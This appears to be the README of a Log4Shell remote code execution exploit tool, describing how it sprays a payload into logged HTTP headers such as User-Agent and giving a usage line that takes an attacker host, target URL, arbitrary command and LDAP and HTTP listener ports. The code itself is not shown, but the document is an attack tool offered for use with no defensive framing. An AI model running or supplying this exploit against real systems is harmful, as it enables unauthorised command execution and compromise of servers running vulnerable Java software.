## Log4Shell RCE Exploit 

[![asciicast](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj.svg)](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj)

fully independent exploit does not require any 3rd party binaries.
The exploit spraying the payload to all possible logged HTTP Headers such as `X-Forwarding , Server-IP , User-Agent` 
### Usage
```shell
python main.py -i lhost -u http://target:targetport -c "command_to_execute" -p lhttp_port -l lldap_port
 ```


### Requirements 
- java-8-openjdk
- pip install -r requirements.txt
- python3.6+
